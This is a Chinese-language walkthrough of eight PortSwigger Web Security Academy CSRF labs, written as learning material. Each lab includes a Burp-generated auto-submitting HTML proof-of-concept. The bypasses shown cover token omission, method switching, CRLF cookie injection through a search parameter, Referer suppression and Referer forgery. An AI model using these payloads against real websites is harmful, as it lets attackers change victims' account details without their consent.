[TOC]

#### 1. CSRF vulnerability with no defenses

* 用给的账号登陆

* 更改email，并抓包

* 在burp里面生成CSRF PoC，并确定自动提交

    ```html
    <html>
      <!-- CSRF PoC - generated by Burp Suite Professional -->
      <body>
      <script>history.pushState('', '', '/')</script>
        <form action="https://ac451f1d1e0a9d0a8074031e0039009e.web-security-academy.net/email/change-email" method="POST">
          <input type="hidden" name="email" value="456&#64;ae" />
          <input type="submit" value="Submit request" />
        </form>
        <script>
          document.forms[0].submit();
        </script>
      </body>
    </html>
    ```

* 复制这个到exploit server的body框，点击store。
  

#### 2. CSRF where token validation depends on request method

[CSRF 绕过方式](https://xz.aliyun.com/t/6176#toc-2)

这里抓包之后发现有CSRF-token，盲猜在GET请求的时候不会检查这个。

还是按照前面的过程，但是将自动生成的那个`method="POST"`改成`method="GET"`或者删掉。

然后复制到exploit server，最后store。

#### 3. CSRF where token validation depends on token being present

直接提交不行，改成GET也不行。

[CSRF 绕过方式](https://xz.aliyun.com/t/6176#toc-4)

> ### 删除token参数或发送空token
>
> 不发送token也可以正常请求数据是因为这种逻辑错误在应用程序中非常常见：应用程序有时会在token存在的时候或者token参数不为空的时候检查token的有效性。这种情况下，如果一个请求不包含token或者token值为空，那么也是有可能绕过CSRF的防御的。

这里将token改成空，发现不行。

删除token之后通过了验证。

#### 4. CSRF where token is not tied to user session

[CSRF 绕过方式](https://xz.aliyun.com/t/6176#toc-5)

这里题目给的提示是token没有绑定session，那我们可以用自己的token去试试。

我一开始怎么试都不行，然后又多试了几下，发现token变了，说明token是一次性的。

这里自己改一下密码，然后拦截一下包，复制了token之后就把包给drop了，这时候再用这个复制好的token就可以了。

#### 5. CSRF where token is tied to non-session cookie

先用wiener的账号试了两次改邮箱，发现两次的csrf和csrfKey都是一样的，说明这次的token不是一次性的。

然后我用wiener的csrf和csrfKey去更改carlos邮箱发现也是可以的，证明这个session和csrfKey不是绑定的。

现在的要做的就是更改受害者的cookie，然后再让他点击钓鱼网站。

然后我就卡住了...

看了一下官方的解题过程，是在搜索框使用的CRLF漏洞。

POC:

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://acbe1f681eaad119806704c500280028.web-security-academy.net/email/change-email" method="POST">
      <input type="hidden" name="email" value="456&#64;ae" />
      <input type="hidden" name="csrf" value="P9Rn0kUekymbUYAKylxoJ8PkvsRczN2d" />
      <input type="submit" value="Submit request" />
    </form>
	<img src="https://acbe1f681eaad119806704c500280028.web-security-academy.net/?search=aaa%0d%0aSet-Cookie:%20csrfKey=W0z6LHzn3a7FzVcJeZvg8oAoljRdIvoh" onerror="document.forms[0].submit()">
  </body>
</html>
```

#### 6. CSRF where token is duplicated in cookie

[CSRF 绕过方式](https://xz.aliyun.com/t/6176#toc-6)

这里应该是cookie里的csrf和参数里的csrf一样就能绕过了。

而且看了一下搜索框仍然有那个CRLF漏洞。

POC:

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://acb71f311ef923a2805b169300560070.web-security-academy.net/email/change-email" method="POST">
      <input type="hidden" name="email" value="456&#64;ae" />
      <input type="hidden" name="csrf" value="eval" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://acb71f311ef923a2805b169300560070.web-security-academy.net/?search=aaa%0d%0aSet-Cookie:%20csrf=eval" onerror="document.forms[0].submit()">
  </body>
</html>
```

#### 7. CSRF where Referer validation depends on header being present

[CSRF 绕过方式](https://xz.aliyun.com/t/6176#toc-8)

用burp抓包发现不添加referer也可以更改成功。

POC：

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://acaa1fd11fee69f880217f8f00d70039.web-security-academy.net/email/change-email" method="POST">
      <input type="hidden" name="email" value="111&#64;uu" />
      <input type="submit" value="Submit request" />
    </form>
	<meta name ="referrer" content ="no-referrer">
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

#### 8. CSRF with broken Referer validation

[CSRF 绕过方式](https://xz.aliyun.com/t/6176#toc-9)

通过不断地测试，发现这里是白名单测试referer里的字段`acbf1f801eb6b1f880d389f200970060.web-security-academy.net`，只要将这个改成`acbf1f801eb6b1f880d389f200970060.web-security-academy.net.xxx`就可以绕过，如果能够用原来的referer也行。

使用`history.pushState("", "", "/?acbf1f801eb6b1f880d389f200970060.web-security-academy.net")`就可以更改referer，便可以绕过。

POC:

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/?acbf1f801eb6b1f880d389f200970060.web-security-academy.net')</script>
    <form action="https://acbf1f801eb6b1f880d389f200970060.web-security-academy.net/email/change-email" method="POST">
      <input type="hidden" name="email" value="111&#64;uu" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

